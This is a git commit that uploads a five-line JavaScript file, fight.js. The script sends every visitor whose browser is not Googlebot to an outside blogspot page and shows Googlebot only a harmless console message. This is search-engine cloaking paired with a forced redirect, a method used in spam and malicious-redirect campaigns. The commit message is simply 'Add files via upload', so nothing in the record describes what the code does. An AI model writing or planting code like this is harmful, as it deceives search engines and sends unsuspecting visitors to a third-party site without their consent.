e5342caff7189b5a826addc6437af6acfc8562a5
Chuck Yate <chuckyates313@gmail.com>
2026-08-23 07:02:18 +0600

    Add files via upload

---
+++ fight.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://bingsportseurop.blogspot.com/2026/08/bnvd.html";
+} else {
+  console.log("Thanks for visiting my page" );
+}
